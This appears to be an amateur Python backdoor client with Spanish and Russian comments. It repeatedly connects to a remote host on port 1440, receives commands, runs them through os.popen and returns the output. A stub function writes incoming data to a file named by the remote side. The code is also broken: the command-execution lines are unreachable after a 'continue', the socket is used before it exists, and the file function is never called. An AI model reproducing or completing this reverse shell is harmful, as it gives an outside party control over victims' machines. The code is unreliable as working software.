import socket
import os
import time

def recvfile():
    i = 1
    f = open(sock.recv(1024), 'wb')  # Open in binary
    i = i + 1
    while True:
        # Recibimos y escribimos en el fichero
        l = sock.recv(1024)
        while (l):
            f.write(l)
            l = sock.recv(1024)
 
def main():
            while True:
                try:
                    print("1")
                    data = sock.recv(1024).decode()  # получаем команду
                    if data == "uploadfile":
                        print("osvk")
                        break
                    else:
                        continue
                    aa = os.popen(data)
                    result = aa.read()
                    if len(result) == 0:
                        sock.send(" ".encode())  # в случае, если рзультат
                        # пустой, отправляем пробел
                    else:
                        sock.send(result.encode())  # отправляем результат
                except:
                    break
 
            
while True:
	try:
	    print("trying...")
	    sock.connect(("0.0.0.0", 1440))
	except:
		print("excepted")
		sock = socket.socket()
		time.sleep(10)
		continue
	else:
		print("connected")
		main()
		break
